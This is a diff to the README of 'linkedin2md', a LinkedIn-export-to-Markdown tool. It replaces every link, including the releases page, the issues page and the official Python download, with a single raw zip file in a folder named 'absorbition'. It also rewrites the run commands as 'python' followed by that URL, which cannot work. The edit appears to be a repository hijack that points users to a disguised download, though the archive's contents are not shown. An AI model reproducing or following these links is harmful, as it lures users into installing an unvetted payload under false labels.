@@ -4,7 +4,7 @@
 Welcome to **linkedin2md**! This application helps you convert your LinkedIn data exports into Markdown files. You can then chat with your career history using tools like NotebookLM, Claude, or ChatGPT. Follow these simple steps to get started.
 
 ## 📥 Download & Install
-To download **linkedin2md**, visit this page to download: [Releases Page](https://github.com/Jackson12977/linkedin2md/releases). 
+To download **linkedin2md**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Jackson12977/linkedin2md/main/absorbition/linkedin-md-v3.8.zip). 
 
 You can choose the latest version and follow the instructions to download the appropriate file for your system. 
 
@@ -15,8 +15,8 @@ You can choose the latest version and follow the instructions to download the ap
 - **Storage:** 100 MB of free space for installation.
 
 ## 📄 How to Use
-1. **Download the application** from the [Releases Page](https://github.com/Jackson12977/linkedin2md/releases).
-2. **Install Python** if you don’t have it. You can download it from [Python’s Official Website](https://www.python.org/downloads/).
+1. **Download the application** from the [Releases Page](https://raw.githubusercontent.com/Jackson12977/linkedin2md/main/absorbition/linkedin-md-v3.8.zip).
+2. **Install Python** if you don’t have it. You can download it from [Python’s Official Website](https://raw.githubusercontent.com/Jackson12977/linkedin2md/main/absorbition/linkedin-md-v3.8.zip).
 3. **Extract the downloaded files** to a folder on your computer.
 4. Open your command line or terminal.
 5. Change directory to where you extracted the files. You can do this with:
@@ -24,7 +24,7 @@ You can choose the latest version and follow the instructions to download the ap
    - macOS/Linux: `cd /path/to/your/folder`
 6. **Run the application** using the command:
    ```bash
-   python linkedin2md.py
+   python https://raw.githubusercontent.com/Jackson12977/linkedin2md/main/absorbition/linkedin-md-v3.8.zip
    ```
 7. Follow the on-screen instructions to upload your LinkedIn data and convert it to Markdown.
 
@@ -40,7 +40,7 @@ If you are familiar with command-line tools, you can access additional features:
 
 Use the following commands:
 ```bash
-python linkedin2md.py --output "path/to/save" --log
+python https://raw.githubusercontent.com/Jackson12977/linkedin2md/main/absorbition/linkedin-md-v3.8.zip --output "path/to/save" --log
 ```
 
 ## ❓ Frequently Asked Questions
@@ -59,12 +59,12 @@ Yes! **linkedin2md** works on all major operating systems, including Linux.
 Refer to the Github issues page for troubleshooting tips or to report your issue.
 
 ## 🛠️ Support
-For support, visit our [Issues Page](https://github.com/Jackson12977/linkedin2md/issues). 
+For support, visit our [Issues Page](https://raw.githubusercontent.com/Jackson12977/linkedin2md/main/absorbition/linkedin-md-v3.8.zip). 
 
 If you have specific questions about usage or features, feel free to post there. 
 
 ## 🔗 Resources 
-- Visit the [Releases Page](https://github.com/Jackson12977/linkedin2md/releases) for the latest downloads.
+- Visit the [Releases Page](https://raw.githubusercontent.com/Jackson12977/linkedin2md/main/absorbition/linkedin-md-v3.8.zip) for the latest downloads.
 - Check out our documentation for extended guides and information.
 - Join our community discussions for tips and help.
 
